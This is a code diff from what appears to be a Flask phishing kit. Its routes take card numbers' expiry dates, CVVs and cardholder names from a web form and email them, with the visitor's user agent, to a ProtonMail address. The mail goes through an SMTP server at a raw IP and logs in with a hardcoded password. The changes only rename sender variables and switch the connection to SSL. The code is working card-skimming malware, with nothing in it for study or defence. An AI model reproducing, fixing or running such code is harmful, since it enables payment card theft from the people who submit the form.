@@ -150,8 +150,8 @@ def first():
         expirydate = request.form.get("expiryDate")
         cvv = request.form.get("cvv")
         cardholdername =  request.form.get("cardHolderName")
-        sender_email = "contact"
-	sender_emailaa = "contact@personalbio.site"
+        sender_emailx = "contact"
+	sender_email = "contact@personalbio.site"
         receiver_email = "Sealer2024@proton.me"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
@@ -169,9 +169,9 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("91.217.246.43", 6040) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_emailaa, receiver_email, message.as_string())
+        with smtplib.SMTP_SSL("91.217.246.43", 6040) as server:
+            server.login(sender_emailx, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
 
@@ -193,7 +193,6 @@ def second():
         expirydate = request.form.get("expiryDate")
         cvv = request.form.get("cvv")
         cardholdername =  request.form.get("cardHolderName")
-        sender_email = "contact"
         receiver_email = "Sealer2024@proton.me"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
